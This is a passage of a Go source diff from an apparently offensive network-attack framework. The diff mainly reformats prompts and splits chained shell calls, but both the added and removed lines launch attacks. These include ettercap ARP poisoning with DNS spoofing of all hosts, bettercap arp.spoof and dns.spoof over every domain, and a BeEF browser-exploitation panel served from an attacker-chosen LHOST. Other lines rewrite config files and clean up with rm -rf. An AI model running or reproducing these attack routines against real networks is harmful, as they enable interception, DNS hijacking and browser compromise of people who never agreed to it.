-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
                 userIface = "eth0"
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
                 userLhost = userLhostIp
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userFakeDns, _ := reader.ReadString('\n')
             userFakeDns = strings.TrimSpace(userFakeDns)
             if userFakeDns == "" {
@@ -371,12 +384,15 @@ func BeefEttercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof ///`, userLhostIp, userIface); fmt.Println()
-            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof ///`, userLhostIp, userIface)
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
+            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
-    fmt.Println()
 }
 
 func BeefBettercap(userTarget string) {
@@ -386,8 +402,8 @@ func BeefBettercap(userTarget string) {
         os.Exit(1)
     }
     menus.MenuThreeFour()
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
     case "0":
@@ -396,8 +412,8 @@ func BeefBettercap(userTarget string) {
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             newString := fmt.Sprintf(`passwd: "%s"`, userPass)
             filesToReplacements := map[string]map[string]string{
@@ -418,18 +434,19 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            subprocess.Popen(`systemctl daemon-reload`)
             }
-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
                 userIface = "eth0"
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
@@ -447,8 +464,11 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
-            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget)
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
+            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
     case "2":
         if _, err := exec.LookPath("beef-xss"); err != nil {
             fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
@@ -457,8 +477,8 @@ func BeefBettercap(userTarget string) {
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             newString := fmt.Sprintf(`passwd: "%s"`, userPass)
             filesToReplacements := map[string]map[string]string{
@@ -479,18 +499,19 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            subprocess.Popen(`systemctl daemon-reload`)
             }
-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
                 userIface = "eth0"
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
@@ -508,19 +529,22 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
-            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface)
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
+            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
-    fmt.Println()
 }
 
 func BeefInjector(userTarget string) {
     for {
         menus.MenuThreeThree()
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         userInput, _ := reader.ReadString('\n')
         userInput = strings.TrimSpace(userInput)
         if userInput == "" {
